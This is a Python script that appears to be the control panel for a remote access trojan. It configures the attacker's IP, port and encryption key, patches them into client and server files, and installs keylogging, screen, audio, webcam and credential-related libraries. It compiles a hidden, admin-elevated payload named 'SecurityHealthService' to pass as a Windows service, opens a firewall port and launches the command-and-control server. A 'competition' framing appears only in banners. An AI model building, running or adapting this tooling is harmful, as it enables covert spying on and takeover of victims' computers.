#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
    T0OL-B4S3-263 - Ultimate RAT Control Center
    International Competition Edition
═══════════════════════════════════════════════════════════════
"""

import os
import sys
import json
import socket
import subprocess
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
# COLORS & STYLING
# ═══════════════════════════════════════════════════════════════

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

CONFIG_FILE = "t0ol_config.json"

DEFAULT_CONFIG = {
    "server_ip": "127.0.0.1",
    "server_port": 4444,
    "encryption_key": None,
    "configured": False
}

def load_config():
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return DEFAULT_CONFIG.copy()

def save_config(config):
    """Save configuration to file"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    print(f"{Colors.GREEN}[+] Configuration saved!{Colors.END}")

# ═══════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ████████╗ ██████╗  ██████╗ ██╗      ██████╗  █████╗ ███████╗███████╗
    ╚══██╔══╝██╔═████╗██╔═████╗██║      ██╔══██╗██╔══██╗██╔════╝██╔════╝
       ██║   ██║██╔██║██║██╔██║██║█████╗██████╔╝███████║███████╗█████╗  
       ██║   ████╔╝██║████╔╝██║██║╚════╝██╔══██╗██╔══██║╚════██║██╔══╝  
       ██║   ╚██████╔╝╚██████╔╝███████╗ ██████╔╝██║  ██║███████║███████╗
       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
{Colors.END}
{Colors.YELLOW}                        ════ T0OL-B4S3-263 ════{Colors.END}
{Colors.MAGENTA}                 Ultimate RAT Control Center v1.0{Colors.END}
{Colors.CYAN}              International Cybersecurity Competition{Colors.END}

{Colors.WHITE}════════════════════════════════════════════════════════════════════{Colors.END}
"""
    print(banner)

# ═══════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_status(message, status="info"):
    """Print formatted status message"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    if status == "success":
        print(f"{Colors.GREEN}[{timestamp}] [+] {message}{Colors.END}")
    elif status == "error":
        print(f"{Colors.RED}[{timestamp}] [-] {message}{Colors.END}")
    elif status == "warning":
        print(f"{Colors.YELLOW}[{timestamp}] [!] {message}{Colors.END}")
    else:
        print(f"{Colors.CYAN}[{timestamp}] [*] {message}{Colors.END}")

def press_enter():
    """Wait for user to press enter"""
    input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.END}")

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION WIZARD
# ═══════════════════════════════════════════════════════════════

def configuration_wizard():
    """Interactive configuration setup"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║              CONFIGURATION WIZARD                        ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    config = load_config()
    
    # Get server IP
    local_ip = get_local_ip()
    print(f"{Colors.WHITE}[1/3] Server IP Configuration{Colors.END}")
    print(f"{Colors.YELLOW}      Your detected local IP: {local_ip}{Colors.END}")
    server_ip = input(f"{Colors.CYAN}      Enter server IP [{local_ip}]: {Colors.END}").strip()
    if not server_ip:
        server_ip = local_ip
    config['server_ip'] = server_ip
    print_status(f"Server IP set to: {server_ip}", "success")
    print()
    
    # Get server port
    print(f"{Colors.WHITE}[2/3] Server Port Configuration{Colors.END}")
    port_input = input(f"{Colors.CYAN}      Enter server port [4444]: {Colors.END}").strip()
    if port_input and port_input.isdigit():
        config['server_port'] = int(port_input)
    else:
        config['server_port'] = 4444
    print_status(f"Server port set to: {config['server_port']}", "success")
    print()
    
    # Generate encryption key
    print(f"{Colors.WHITE}[3/3] Encryption Key Generation{Colors.END}")
    generate = input(f"{Colors.CYAN}      Generate new encryption key? (y/n) [y]: {Colors.END}").strip().lower()
    if generate != 'n':
        from cryptography.fernet import Fernet
        key = Fernet.generate_key().decode()
        config['encryption_key'] = key
        print_status("Encryption key generated!", "success")
        print(f"{Colors.YELLOW}      Key: {key[:20]}...{Colors.END}")
    else:
        if config['encryption_key']:
            print_status("Using existing encryption key", "info")
        else:
            print_status("No encryption key set! Generate one before compiling.", "warning")
    
    config['configured'] = True
    save_config(config)
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}✓ Configuration complete!{Colors.END}")
    press_enter()

# ═══════════════════════════════════════════════════════════════
# APPLY CONFIGURATION
# ═══════════════════════════════════════════════════════════════

def apply_config_to_files():
    """Apply configuration to client and server files"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║           APPLYING CONFIGURATION TO FILES                ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    config = load_config()
    
    if not config.get('configured') or not config.get('encryption_key'):
        print_status("Configuration incomplete! Run setup first.", "error")
        press_enter()
        return False
    
    # Apply to client
    print_status("Configuring rat_ultimate.py...", "info")
    if os.path.exists('rat_ultimate.py'):
        with open('rat_ultimate.py', 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Replace configuration values
        content = content.replace('HOST = "YOUR_ATTACKER_IP_HERE"', f'HOST = "{config["server_ip"]}"')
        content = content.replace('PORT = 4444', f'PORT = {config["server_port"]}')
        content = content.replace('KEY = b\'YOUR_ENCRYPTION_KEY_HERE\'', f'KEY = b\'{config["encryption_key"]}\'')
        
        with open('rat_ultimate.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        print_status("Client configured successfully!", "success")
    else:
        print_status("rat_ultimate.py not found!", "error")
        press_enter()
        return False
    
    # Apply to server
    print_status("Configuring rat_server_fixed.py...", "info")
    if os.path.exists('rat_server_fixed.py'):
        with open('rat_server_fixed.py', 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Replace configuration values
        content = content.replace('KEY = b\'YOUR_ENCRYPTION_KEY_HERE\'', f'KEY = b\'{config["encryption_key"]}\'')
        content = content.replace('PORT = 4444', f'PORT = {config["server_port"]}')
        
        with open('rat_server_fixed.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        print_status("Server configured successfully!", "success")
    else:
        print_status("rat_server_fixed.py not found!", "error")
        press_enter()
        return False
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}✓ All files configured!{Colors.END}")
    press_enter()
    return True

# ═══════════════════════════════════════════════════════════════
# INSTALL DEPENDENCIES
# ═══════════════════════════════════════════════════════════════

def install_dependencies():
    """Install required Python packages"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║             INSTALLING DEPENDENCIES                      ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    packages = [
        'cryptography',
        'mss',
        'pynput',
        'opencv-python',
        'psutil',
        'pyaudio',
        'pyperclip',
        'Pillow',
        'numpy',
        'pywin32',
        'requests',
        'pyinstaller'
    ]
    
    print_status(f"Installing {len(packages)} packages...", "info")
    print()
    
    for package in packages:
        print(f"{Colors.YELLOW}[*] Installing {package}...{Colors.END}")
        result = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', package],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print(f"{Colors.GREEN}    ✓ {package} installed{Colors.END}")
        else:
            print(f"{Colors.RED}    ✗ {package} failed{Colors.END}")
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}✓ Dependencies installed!{Colors.END}")
    press_enter()

# ═══════════════════════════════════════════════════════════════
# COMPILE CLIENT
# ═══════════════════════════════════════════════════════════════

def compile_client():
    """Compile RAT client to executable"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║              COMPILING CLIENT PAYLOAD                    ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    config = load_config()
    
    if not config.get('configured'):
        print_status("Configuration incomplete! Run setup first.", "error")
        press_enter()
        return
    
    if not os.path.exists('rat_ultimate.py'):
        print_status("rat_ultimate.py not found!", "error")
        press_enter()
        return
    
    print_status("Starting compilation...", "info")
    print(f"{Colors.YELLOW}This may take 2-3 minutes...{Colors.END}\n")
    
    import PyInstaller.__main__
    
    try:
        PyInstaller.__main__.run([
            'rat_ultimate.py',
            '--onefile',
            '--noconsole',
            '--icon=NONE',
            '--clean',
            '--distpath=./output',
            '--workpath=./build',
            '--specpath=./build',
            '--name=SecurityHealthService',
            '--uac-admin',
            '--hidden-import=mss',
            '--hidden-import=mss.tools',
            '--hidden-import=pynput.keyboard',
            '--hidden-import=cv2',
            '--hidden-import=psutil',
            '--hidden-import=pyaudio',
            '--hidden-import=pyperclip',
            '--hidden-import=PIL',
            '--hidden-import=numpy',
            '--hidden-import=win32crypt',
            '--hidden-import=requests',
        ])
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}✓ Compilation successful!{Colors.END}")
        print(f"{Colors.CYAN}[*] Output: ./output/SecurityHealthService.exe{Colors.END}")
        
    except Exception as e:
        print(f"\n{Colors.RED}✗ Compilation failed: {str(e)}{Colors.END}")
    
    press_enter()

# ═══════════════════════════════════════════════════════════════
# START SERVER
# ═══════════════════════════════════════════════════════════════

def start_server():
    """Launch C2 server"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║               STARTING C2 SERVER                         ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    config = load_config()
    
    if not config.get('configured'):
        print_status("Configuration incomplete! Run setup first.", "error")
        press_enter()
        return
    
    if not os.path.exists('rat_server_fixed.py'):
        print_status("rat_server_fixed.py not found!", "error")
        press_enter()
        return
    
    print_status(f"Server IP: {config['server_ip']}", "info")
    print_status(f"Server Port: {config['server_port']}", "info")
    print(f"\n{Colors.YELLOW}Press CTRL+C in the server window to stop{Colors.END}\n")
    
    try:
        subprocess.run([sys.executable, 'rat_server_fixed.py'])
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Server stopped{Colors.END}")
    
    press_enter()

# ═══════════════════════════════════════════════════════════════
# VIEW CONFIGURATION
# ═══════════════════════════════════════════════════════════════

def view_config():
    """Display current configuration"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║            CURRENT CONFIGURATION                         ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    config = load_config()
    
    print(f"{Colors.WHITE}Server IP:{Colors.END}       {Colors.CYAN}{config.get('server_ip', 'Not set')}{Colors.END}")
    print(f"{Colors.WHITE}Server Port:{Colors.END}     {Colors.CYAN}{config.get('server_port', 'Not set')}{Colors.END}")
    
    if config.get('encryption_key'):
        key_preview = config['encryption_key'][:20] + "..."
        print(f"{Colors.WHITE}Encryption Key:{Colors.END}  {Colors.CYAN}{key_preview}{Colors.END}")
    else:
        print(f"{Colors.WHITE}Encryption Key:{Colors.END}  {Colors.RED}Not set{Colors.END}")
    
    if config.get('configured'):
        print(f"\n{Colors.WHITE}Status:{Colors.END}          {Colors.GREEN}✓ Configured{Colors.END}")
    else:
        print(f"\n{Colors.WHITE}Status:{Colors.END}          {Colors.RED}✗ Not configured{Colors.END}")
    
    press_enter()

# ═══════════════════════════════════════════════════════════════
# OPEN FIREWALL PORT
# ═══════════════════════════════════════════════════════════════

def open_firewall():
    """Open firewall port for C2 server"""
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
    print(f"║            OPEN FIREWALL PORT                            ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    config = load_config()
    port = config.get('server_port', 4444)
    
    print_status(f"Opening port {port} in Windows Firewall...", "info")
    print(f"{Colors.YELLOW}This requires administrator privileges!{Colors.END}\n")
    
    cmd = f'netsh advfirewall firewall add rule name="T0OL-B4S3-263" dir=in action=allow protocol=TCP localport={port}'
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print_status(f"Port {port} opened successfully!", "success")
        else:
            print_status("Failed to open port. Run as administrator!", "error")
            print(f"{Colors.RED}{result.stderr}{Colors.END}")
    except Exception as e:
        print_status(f"Error: {str(e)}", "error")
    
    press_enter()

# ═══════════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════════

def main_menu():
    """Display main menu"""
    while True:
        clear_screen()
        print_banner()
        
        config = load_config()
        config_status = f"{Colors.GREEN}✓ Configured{Colors.END}" if config.get('configured') else f"{Colors.RED}✗ Not configured{Colors.END}"
        
        print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗")
        print(f"║                    MAIN MENU                             ║")
        print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        print(f"{Colors.WHITE}Status: {config_status}{Colors.END}\n")
        
        print(f"{Colors.CYAN}{Colors.BOLD}[SETUP]{Colors.END}")
        print(f"{Colors.WHITE}  1.{Colors.END} Configuration Wizard")
        print(f"{Colors.WHITE}  2.{Colors.END} Install Dependencies")
        print(f"{Colors.WHITE}  3.{Colors.END} Apply Config to Files")
        print(f"{Colors.WHITE}  4.{Colors.END} View Configuration")
        print(f"{Colors.WHITE}  5.{Colors.END} Open Firewall Port\n")
        
        print(f"{Colors.CYAN}{Colors.BOLD}[BUILD]{Colors.END}")
        print(f"{Colors.WHITE}  6.{Colors.END} Compile Client (RAT Payload)\n")
        
        print(f"{Colors.CYAN}{Colors.BOLD}[OPERATION]{Colors.END}")
        print(f"{Colors.WHITE}  7.{Colors.END} Start C2 Server\n")
        
        print(f"{Colors.CYAN}{Colors.BOLD}[OTHER]{Colors.END}")
        print(f"{Colors.WHITE}  0.{Colors.END} Exit\n")
        
        choice = input(f"{Colors.CYAN}{Colors.BOLD}T0OL-B4S3-263>{Colors.END} ").strip()
        
        if choice == '1':
            configuration_wizard()
        elif choice == '2':
            install_dependencies()
        elif choice == '3':
            apply_config_to_files()
        elif choice == '4':
            view_config()
        elif choice == '5':
            open_firewall()
        elif choice == '6':
            compile_client()
        elif choice == '7':
            start_server()
        elif choice == '0':
            clear_screen()
            print(f"\n{Colors.CYAN}Thanks for using T0OL-B4S3-263!{Colors.END}")
            print(f"{Colors.YELLOW}Good luck with your presentation, baby! 💋{Colors.END}\n")
            sys.exit(0)
        else:
            print_status("Invalid option!", "error")
            press_enter()

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        clear_screen()
        print(f"\n{Colors.YELLOW}[*] Exiting T0OL-B4S3-263...{Colors.END}\n")
        sys.exit(0)